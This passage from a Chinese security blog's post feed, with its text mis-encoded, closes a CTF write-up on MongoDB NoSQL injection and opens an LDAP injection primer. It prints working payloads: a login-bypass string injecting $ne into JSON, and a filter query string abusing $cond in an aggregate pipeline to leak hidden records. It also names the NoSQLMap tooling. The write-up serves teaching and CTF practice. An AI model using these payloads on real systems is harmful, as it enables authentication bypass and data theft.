&#x3D;&gt; [&#39;_id&#39; &#x3D;&gt; &#39;$category&#39;, &#39;count&#39; &#x3D;&gt; [&#39;$sum&#39; &#x3D;&gt; 1]]],</span><br><span class="line">            [&#39;$sort&#39; &#x3D;&gt; [&#39;count&#39; &#x3D;&gt; -1]],</span><br><span class="line">            [&#39;$limit&#39; &#x3D;&gt; 5],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters &#x3D; [</span><br><span class="line">            [&#39;$project&#39; &#x3D;&gt; [&#39;category&#39; &#x3D;&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor &#x3D; $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($filter)): ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">            foreach ($cursor as $category) &#123;</span><br><span class="line">                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&#39;_id&#39;], $category[&#39;count&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php else: ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])): ?&gt;</span><br><span class="line">        Invalid username or password</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action&#x3D;&#39;&#x2F;&#39; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line">        $cursor &#x3D; $collection-&gt;find([&#39;public&#39; &#x3D;&gt; 1]);</span><br><span class="line">        foreach ($cursor as $news) &#123;</span><br><span class="line">            printf(&quot;%s&lt;br&gt;&quot;, $news[&#39;title&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php endif; ?&gt;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€æ­¥æ˜¯åˆ©ç”¨é‡è¨€å¼æ³¨å…¥ç™»å½•ï¼Œä½†æ˜¯æœ‰ç‚¹ä¸åŒçš„æ˜¯ï¼Œè¾“å…¥çš„å‚æ•°è¢«åŒå¼•å·åŒ…æ‹¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•é—­åˆè¿™ä¸ªåŒå¼•å·ï¼Œpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;&#x3D;null&#125;, &quot;username&quot;:admin&quot;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¦‚æœç›´æ¥ä½¿ç”¨<code>&#123;&quot;$ne&quot;:null&#125;</code>ä¼šå‡ºç°500çš„é”™è¯¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä»£ç ï¼š</span><br><span class="line">var_dump(json_decode($raw_query));</span><br><span class="line"></span><br><span class="line">è¾“å‡º:</span><br><span class="line">object(stdClass)#1 (2) &#123;</span><br><span class="line">  [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°<code>&#123;'$ne':null&#125;</code>è¢«è§£ææˆäº†stringè€Œä¸æ˜¯arrayã€‚å‰ä¸€ä¸ªpayloadè™½ç„¶<code>username</code>å’Œ<code>password</code>é‡å¤äº†ï¼Œä½†<code>json_decode</code>æ—¶å˜é‡åªä¼šæ˜¯æœ€åä¸€æ¬¡çš„èµ‹å€¼ã€‚</p>
<p>ç™»å½•æˆåŠŸå</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105403.png" alt=""></p>
<p>filterå‚æ•°é‡Œå¯ä»¥å¡« <code>category</code>å±•ç¤ºç›®å½• <code>text</code>å±•ç¤ºå†…å®¹ <code>title</code>å±•ç¤ºæ ‡é¢˜ï¼Œä½†æ˜¯éƒ½é™åˆ¶äº†5æ¡ã€‚</p>
<p>ä»£ç é‡Œæ˜¯ç”¨çš„MongoDBèšåˆå‡½æ•°<code>aggregate</code>ï¼Œä¸‹é¢è¿™å¼ å›¾ä¹Ÿæ˜¯æ¥è‡ªå®˜æ–¹æ–‡æ¡£è§£é‡Šäº†<code>aggregate</code>å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105017.png" alt=""></p>
<p>ä½¿ç”¨<code>aggregate</code>èšåˆå‡½æ•°æ—¶ï¼Œåœ¨é‡Œé¢æ˜¯å¯ä»¥ä½¿ç”¨æ¡ä»¶åˆ¤æ–­è¯­å¥çš„ã€‚åœ¨MongoDBä¸­<code>$cond</code>è¡¨ç¤ºifåˆ¤æ–­è¯­å¥ï¼ŒåŒ¹é…çš„ç¬¦å·ä½¿ç”¨<code>$eq</code>ï¼Œè¿èµ·æ¥ä¸º<code>[$cond][if][$eq]</code>ï¼Œå½“ä½¿ç”¨å¤šä¸ªåˆ¤æ–­æ¡ä»¶æ—¶é‡å¤è¯¥è¯­å¥å³å¯ã€‚</p>
<p>å®˜æ–¹æ–‡æ¡£åˆ—å‡ºçš„<code>$cond</code>çš„ç”¨æ³•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317113708.png" alt=""></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/">å®˜æ–¹æ–‡æ¡£çš„ä¾‹å­</a>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.inventory.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             item: 1,</span><br><span class="line">             discount:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨æˆ‘ä»¬çš„ç›®çš„æ˜¯ï¼šå¦‚æœ<code>$category</code>çš„å€¼æ˜¯flagï¼Œé‚£ä¹ˆå°±è¾“å‡º<code>$title</code>çš„å†…å®¹ï¼Œå¦åˆ™è¿˜æ˜¯åŸæ ·è¾“å‡º<code>$catagory</code>ï¼Œç…§ç€ä¸Šé¢çš„ä¾‹å­å†™æˆMongoDB shellçš„å½¢å¼å°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.news.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             category:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>è½¬æ¢æˆPHPæ•°ç»„å½¢å¼ä¼ å…¥filterå‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filter[$cond][if][$eq][]&#x3D;flags&amp;filter[$cond][if][$eq][]&#x3D;$category&amp;filter[$cond][then]&#x3D;$title&amp;filter[$cond][else]&#x3D;$category</span><br></pre></td></tr></table></figure>
<p>è½¬æ¢æˆ<code>raw_query</code>çš„å½¢å¼ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;category&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="attr">&quot;$cond&quot;</span>:</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="attr">&quot;if&quot;</span>:</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">&quot;$eq&quot;</span>: [ <span class="string">&quot;$category&quot;</span>, <span class="string">&quot;flags&quot;</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;then&quot;</span>: <span class="string">&quot;$title&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;else&quot;</span>: <span class="string">&quot;$category&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>var_dump(json_decode(raw_query))</code>å³ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object(stdClass)#4 (1) &#123;</span><br><span class="line">  [&quot;category&quot;]&#x3D;&gt;</span><br><span class="line">  object(stdClass)#3 (1) &#123;</span><br><span class="line">    [&quot;$cond&quot;]&#x3D;&gt;</span><br><span class="line">    object(stdClass)#2 (3) &#123;</span><br><span class="line">      [&quot;if&quot;]&#x3D;&gt;</span><br><span class="line">      object(stdClass)#1 (1) &#123;</span><br><span class="line">        [&quot;$eq&quot;]&#x3D;&gt;</span><br><span class="line">        array(2) &#123;</span><br><span class="line">          [0]&#x3D;&gt;</span><br><span class="line">          string(9) &quot;$category&quot;</span><br><span class="line">          [1]&#x3D;&gt;</span><br><span class="line">          string(5) &quot;flags&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      [&quot;then&quot;]&#x3D;&gt;</span><br><span class="line">      string(6) &quot;$title&quot;</span><br><span class="line">      [&quot;else&quot;]&#x3D;&gt;</span><br><span class="line">      string(9) &quot;$category&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131510.png" alt=""></p>
<p>æ¥ç€ç›´æ¥ä¿®æ”¹<code>$title</code>ä¸º<code>$text</code>æŸ¥çœ‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131619.png" alt=""></p>
<p>æˆåŠŸæ‹¿åˆ°flag~</p>
<h3 id="HTB-Mongo">HTB Mongo</h3>
<p>æœ€è¿‘åšäº†ä¸€ä¸ªHackTheBoxçš„é¶æœºï¼Œä¸»è¦è€ƒå¯Ÿçš„å°±æ˜¯å†™è„šæœ¬ç›²æ³¨MongoDBï¼Œé™äºç¯‡å¹…åŸå› ï¼Œå°±ä¸æŠŠwalkthroughè´´åœ¨è¿™é‡Œäº†ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥<a href="https://ca0y1h.top/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/">ç§»æ­¥äºæ­¤</a>ã€‚</p>
<h2 id="0x06-å·¥å…·">0x06 å·¥å…·</h2>
<p>Githubä¸Šæœ‰ä¸ªå«<a href="https://github.com/youngyangyang04/NoSQLAttack">NoSQLAttack</a>å·¥å…·ï¼Œä¸è¿‡å·²ç»æ²¡æœ‰ç»´æŠ¤äº†ã€‚</p>
<p>å¦å¤–è¿˜æœ‰ä¸€ä¸ª<a href="https://github.com/codingo/NoSQLMap">NoSQLMap</a>å·¥å…·ï¼Œè¿™ä¸ªé¡¹ç›®ä½œè€…ä»åœ¨ç»´æŠ¤ã€‚</p>
<h2 id="0x07-å‚è€ƒèµ„æ–™">0x07 å‚è€ƒèµ„æ–™</h2>
<p><a href="https://www.runoob.com/mongodb/">https://www.runoob.com/mongodb/</a></p>
<p><a href="https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0">https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0</a></p>
<p><a href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x03-NoSQL%E6%B3%A8%E5%85%A5">https://www.mi1k7ea.com/2019/08/11/NoSQLæ³¨å…¥ä¹‹MongoDB/#0x03-NoSQLæ³¨å…¥</a></p>
<p><a href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDBæ³¨å…¥æŒ‡åŒ—/index.html</a></p>
<p><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
<p><a href="https://zanon.io/posts/nosql-injection-in-mongodb">https://zanon.io/posts/nosql-injection-in-mongodb</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨å­¦ä¹ </tag>
        <tag>NoSQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</title>
    <url>/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>æ–‡ç« é¦–å‘äº å®‰å…¨å®¢</p>
</blockquote>
<h1 id="ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»">ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</h1>
<p>æœ€è¿‘åœ¨HackTheBoxä¸Šæ°ªäº†é‡‘ï¼ˆè‚‰ç–¼ğŸ˜­ï¼‰ï¼Œåšäº†ä¸€äº›å·²ç»retiredçš„é«˜è´¨é‡é¶æœºï¼Œä¸å¾—ä¸è¯´è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªé¶æœºå«åš<strong>CTF</strong>ï¼Œéš¾åº¦æ˜¯æœ€é«˜çº§åˆ«çš„insaneï¼Œä¸»è¦æ˜¯å®ƒè€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå†·é—¨â€”â€”LDAPæ³¨å…¥ã€‚å¯èƒ½å¾ˆå¤šå°ä¼™ä¼´éƒ½æ²¡æ€ä¹ˆå¬è¯´è¿‡è¿™ä¸ªæ¼æ´ï¼Œæˆ‘æƒ³ä¸»è¦åŸå› è¿˜æ˜¯LDAPè¿™ä¸ªåè®®ç”¨çš„æ¯”è¾ƒå°‘ï¼Œè€Œä¸”å›½å†…CTFæ¯”èµ›ä¸­æˆ‘ä¹ŸåŸºæœ¬ä¸Šæ²¡æœ‰çœ‹åˆ°æœ‰è€ƒå¯Ÿè¿™ä¸ªç‚¹çš„ã€‚åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ€è¿‘ä¸€æ¬¡å‡ºç°è¿™ä¸ªè€ƒç‚¹çš„æ˜¯åœ¨<a href="https://ctftime.org/event/633">CSAW CTF Qualification Round 2018</a>æ¯”èµ›ä¸­ï¼Œé¢˜ç›®ç›´æ¥å‘Šè¯‰ä½ äº†æ˜¯è€ƒLDAPæ³¨å…¥ã€‚åˆšå¥½ä¸Šä¸ªæ˜ŸæœŸæˆ‘åœ¨æ˜Ÿç›Ÿå†…éƒ¨åˆ†äº«ä¸­ï¼Œä¹Ÿæåˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆæœ¬ç€èŠèƒœäºæ— ï¼Œå¼€é˜”çŸ¥è¯†é¢çš„æœ¬æ„ä¸‹ï¼ˆå…¶å®æ˜¯å·æ‡’ï¼Ÿï¼‰ï¼Œå†™ä¸‹è¿™ç¯‡æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»çš„æ–‡ç« ã€‚</p>
<h2 id="0x01-LDAPä»‹ç»">0x01 LDAPä»‹ç»</h2>
<h3 id="ä»€ä¹ˆæ˜¯LDAP">ä»€ä¹ˆæ˜¯LDAP</h3>
<p>åœ¨åšé¶æœºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯LDAPï¼Ÿ</p>
<blockquote>
<p>ä»¥ä¸‹å†…å®¹éƒ¨åˆ†æ‘˜è‡ª2018 blackhat <em>LDAP Injection &amp; Blind LDAP Injection</em></p>
</blockquote>
<p>LDAP(Lightweight Directory Access Protocol):è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œæ˜¯ä¸€ç§åœ¨çº¿ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºç›®å½•ä¸­èµ„æºçš„æœç´¢å’ŒæŸ¥è¯¢ï¼Œæ˜¯X.500çš„ä¸€ç§ç®€ä¾¿çš„å®ç°ã€‚</p>
<p>é‚£ä¹ˆè½¬æ¢æˆäººè¯å°±æ˜¯è¯´ï¼ŒLDAPæ˜¯ç”¨äºè®¿é—®ç›®å½•æœåŠ¡ï¼ˆç‰¹åˆ«æ˜¯åŸºäºX.500çš„ç›®å½•æœåŠ¡ï¼‰çš„è½»é‡çº§å®¢æˆ·ç«¯æœåŠ¡å™¨åè®®ï¼Œå®ƒé€šè¿‡TCP/IPä¼ è¾“æœåŠ¡è¿è¡Œã€‚å…³é”®çš„åœ°æ–¹å°±åœ¨äºï¼Œ<strong>æ•°æ®æ˜¯å­˜å‚¨åœ¨ç›®å½•ä¸­ï¼Œè€Œä¸æ˜¯æ•°æ®åº“ä¸­</strong>ã€‚çš„ç¡®ï¼Œç›®å½•å’Œæ•°æ®åº“æœ‰å¾ˆå¤šå…±åŒä¹‹å¤„ï¼Œéƒ½èƒ½å­˜å‚¨æ•°æ®ã€å¹¶èƒ½åœ¨ä¸€å®šç¨‹åº¦è¿›è¡Œæœç´¢å’ŒæŸ¥è¯¢ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œç›®å½•å’Œæ•°æ®åº“çš„åŒºåˆ«åœ¨å“ªï¼Ÿ</p>
<p>æœ€é‡è¦çš„åŒºåˆ«å°±æ˜¯<strong>ç›®å½•é€‚åˆäºå­˜æ”¾é™æ€æ•°æ®</strong>ï¼Œå®ƒå­˜å‚¨çš„æ•°æ®æ— è®ºåœ¨ç±»å‹å’Œç§ç±»è¾ƒä¹‹æ•°æ®åº“ä¸­çš„æ•°æ®éƒ½è¦æ›´ä¸ºç¹å¤šï¼ŒåŒ…æ‹¬éŸ³é¢‘ã€è§†é¢‘ã€å¯æ‰§è¡Œæ–‡ä»¶ã€æ–‡æœ¬ç­‰æ–‡ä»¶ï¼Œå¦å¤–ç›®å½•ä¸­è¿˜å­˜åœ¨ç›®å½•çš„é€’å½’ã€‚æ—¢ç„¶æ˜¯å­˜æ”¾ä¸åŒç±»å‹çš„é™æ€æ•°æ®ï¼Œé‚£ä¹ˆç›®å½•æœåŠ¡åœ¨è¿›è¡Œä¼˜åŒ–åæ›´é€‚å®œäºè¯»è®¿é—®ï¼Œè€Œéå†™ã€ä¿®æ”¹ç­‰æ“ä½œã€‚</p>
<p>è¯´äº†è¿™ä¹ˆåŠå¤©ï¼Œæ„Ÿè§‰è¿˜æ˜¯è´´ä¸€å¼ å›¾æ¥çš„æ›´å¿«ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721143738.png" alt=""></p>
<p>ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºäº†LDAPçš„ç»“æ„ã€‚æˆ‘ä»¬éƒ½çŸ¥é“MySQLæ•°æ®åº“ä¸­çš„æ•°æ®éƒ½æ˜¯æŒ‰è®°å½•ä¸€æ¡æ¡è®°å½•å­˜åœ¨è¡¨ä¸­ï¼Œè€ŒLDAPæ˜¯æ ‘ç»“æ„çš„ï¼Œæ•°æ®å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ä¸Šã€‚æ¯”å¦‚è¦æè¿°ä¸Šå›¾<code>baby</code>è¿™ä¸ªèŠ‚ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org</span><br></pre></td></tr></table></figure>
<h3 id="LDAPçš„åŸºæœ¬æ¦‚å¿µ">LDAPçš„åŸºæœ¬æ¦‚å¿µ</h3>
<p>åœ¨å¤§æ¦‚çŸ¥é“LDAPæ˜¯åšä»€ä¹ˆã€é•¿ä»€ä¹ˆæ ·ä¹‹åï¼Œæˆ‘ä»¬å†æ¥äº†è§£ä¸€ä¸‹LDAPçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œä¸»è¦æ˜¯ä¸‰ä¸ªä¸“æœ‰åè¯ï¼šæ¡ç›®ï¼ˆEntryï¼‰ã€å±æ€§ï¼ˆAttributeï¼‰ã€å¯¹è±¡ç±»ï¼ˆObjectClassï¼‰ã€‚</p>
<p><strong>æ¡ç›®</strong></p>
<p>æ¡ç›®ï¼Œä¹Ÿå«è®°å½•é¡¹ï¼Œæ˜¯LDAPä¸­æœ€åŸºæœ¬çš„é¢—ç²’ï¼Œå°±æƒ³å­—å…¸ä¸­çš„è¯æ¡æˆ–è€…æ˜¯æ•°æ®ä¸­çš„è®°å½•ã€‚é€šå¸¸å¯¹LDAPçš„æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æœç´¢éƒ½æ˜¯ä»¥æ¡ç›®ä¸ºåŸºæœ¬å•ä½ã€‚</p>
<p><strong>å±æ€§</strong></p>
<p>æ¯ä¸ªæ¡ç›®éƒ½å¯ä»¥æœ‰å¾ˆå¤šå±æ€§ï¼ˆAttributeï¼‰ï¼Œæ¯”å¦‚å¸¸è§çš„äººéƒ½æœ‰å§“åã€åœ°å€ã€ç”µè¯ç­‰å±æ€§ã€‚æ¯ä¸ªå±æ€§éƒ½æœ‰åç§°åŠå¯¹åº”çš„å€¼ï¼Œå±æ€§å€¼å¯ä»¥æœ‰å•ä¸ªã€å¤šä¸ªï¼Œæ¯”å¦‚ä½ æœ‰å¤šä¸ªé‚®ç®±ã€‚</p>
<p>æ­¤å¤–ï¼ŒLDAPä¸ºäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡éƒ½è®¾è®¡äº†å±æ€§(æ¯”å¦‚commonNameï¼Œsurname)ã€‚</p>
<p><strong>å¯¹è±¡ç±»</strong></p>
<p>å¯¹è±¡ç±»æ˜¯å±æ€§çš„é›†åˆï¼ŒLDAPé¢„æƒ³äº†å¾ˆå¤šäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶å°è£…æˆå¯¹è±¡ç±»ã€‚æ¯”å¦‚äººå‘˜ï¼ˆpersonï¼‰å«æœ‰å§“ï¼ˆsnï¼‰ã€åï¼ˆcnï¼‰ã€ç”µè¯(telephoneNumber)ã€å¯†ç (userPassword)ç­‰å±æ€§ï¼Œå•ä½èŒå·¥(organizationalPerson)æ˜¯äººå‘˜(person)çš„ç»§æ‰¿ç±»ï¼Œé™¤äº†ä¸Šè¿°å±æ€§ä¹‹å¤–è¿˜å«æœ‰èŒåŠ¡ï¼ˆtitleï¼‰ã€é‚®æ”¿ç¼–ç ï¼ˆpostalCodeï¼‰ã€é€šä¿¡åœ°å€(postalAddress)ç­‰å±æ€§ã€‚</p>
<p>é€šè¿‡å¯¹è±¡ç±»å¯ä»¥æ–¹ä¾¿çš„å®šä¹‰æ¡ç›®ç±»å‹ã€‚æ¯ä¸ªæ¡ç›®å¯ä»¥ç›´æ¥ç»§æ‰¿å¤šä¸ªå¯¹è±¡ç±»ï¼Œè¿™æ ·å°±ç»§æ‰¿äº†å„ç§å±æ€§ã€‚å¦‚æœ2ä¸ªå¯¹è±¡ç±»ä¸­æœ‰ç›¸åŒçš„å±æ€§ï¼Œåˆ™æ¡ç›®ç»§æ‰¿ååªä¼šä¿ç•™1ä¸ªå±æ€§ã€‚å¯¹è±¡ç±»åŒæ—¶ä¹Ÿè§„å®šäº†å“ªäº›å±æ€§æ˜¯åŸºæœ¬ä¿¡æ¯ï¼Œå³å¿…è¦å±æ€§å’Œå¯é€‰å±æ€§ã€‚</p>
<p>æ˜¯ä¸æ˜¯å¬èµ·æ¥å’Œé¢å‘å¯¹è±¡è¯­è¨€æœ‰ç‚¹ç›¸ä¼¼ï¼Œè·ŸJavaä¸­çš„Objectç±»ä¸€æ ·ï¼ŒLDAPçš„æ ¹å¯¹è±¡ç±»å°±å«åštopã€‚</p>
<p>ä¸Šè¿°å°±æ˜¯ç¬”è€…å¯¹LDAPæ•°æ®ç»“æ„çš„ç®€å•ä»‹ç»äº†ï¼ŒLDAPæ—¢ç„¶ä¸»è¦ç”¨äºæœç´¢æŸ¥è¯¢ï¼Œé‚£å®ƒæ˜¯æ€ä¹ˆæŸ¥è¯¢çš„å‘¢ï¼Ÿ</p>
<h3 id="LDAPçš„åŸºæœ¬è¯­æ³•">LDAPçš„åŸºæœ¬è¯­æ³•</h3>
<p>LDAPçš„è¯­æ³•éå¸¸ç®€å•ï¼Œä¸€çœ‹å°±ä¼šï¼Œå†çœ‹å°±æ‡‚ã€‚</p>
<blockquote>
<p>ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://blog.csdn.net/leader_ww/article/details/4028672</p>
</blockquote>
<p><strong>=ï¼ˆç­‰äºï¼‰</strong></p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§<code>giveNname</code>å€¼ä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(givenName=John)</code>ã€‚è¿™ä¼šè¿”å›å¯¹åº”æ¡ä»¶çš„æ‰€æœ‰å¯¹è±¡ã€‚</p>
<p><strong>&amp;ï¼ˆé€»è¾‘ä¸ï¼‰</strong></p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±…ä½åœ¨ Dallas å¹¶ä¸”<code>givenName</code>ä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(&amp;(givenName=John)(l=Dallas))</code>ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œæ¯ä¸ªå‚æ•°éƒ½è¢«å±äºå…¶è‡ªå·±çš„åœ†æ‹¬å·æ‹¬èµ·æ¥ã€‚æ•´ä¸ª LDAP è¯­å¥å¿…é¡»åŒ…æ‹¬åœ¨ä¸€å¯¹ä¸»åœ†æ‹¬å·ä¸­ã€‚æ“ä½œç¬¦ &amp; è¡¨æ˜ï¼Œåªæœ‰æ¯ä¸ªå‚æ•°éƒ½ä¸ºçœŸï¼Œæ‰ä¼šå°†æ­¤ç­›é€‰æ¡ä»¶åº”ç”¨åˆ°è¦æŸ¥è¯¢çš„å¯¹è±¡ã€‚</p>
<p><strong>|ï¼ˆé€»è¾‘æˆ–ï¼‰</strong></p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§<code>givenName</code>å€¼ä¸ºJhonæˆ–è€…Jackçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(|(givenName=Jhon)(givenName=Jack))</code>ã€‚</p>
<p><strong>!ï¼ˆé€»è¾‘éï¼‰</strong></p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦æŸ¥æ‰¾<code>givenName</code>ä¸ºJohnçš„å¯¹è±¡ä»¥å¤–çš„æ‰€æœ‰å¯¹è±¡ã€‚åˆ™åº”ä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼š<code>(!givenName=John)</code></p>
<p><strong>*ï¼ˆé€šé…ç¬¦ï¼‰</strong></p>
<p>å¯ä½¿ç”¨é€šé…ç¬¦è¡¨ç¤ºå€¼å¯ä»¥ç­‰äºä»»ä½•å€¼ã€‚ä½¿ç”¨å®ƒçš„æƒ…å†µå¯èƒ½æ˜¯ï¼šæ‚¨å¸Œæœ›æŸ¥æ‰¾å…·æœ‰èŒåŠ¡å¤´è¡”çš„æ‰€æœ‰å¯¹è±¡ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨<code>(title=*)</code>ï¼Œè¿™ä¼šè¿”å›<code>title</code>å±æ€§åŒ…å«å†…å®¹çš„æ‰€æœ‰å¯¹è±¡ã€‚</p>
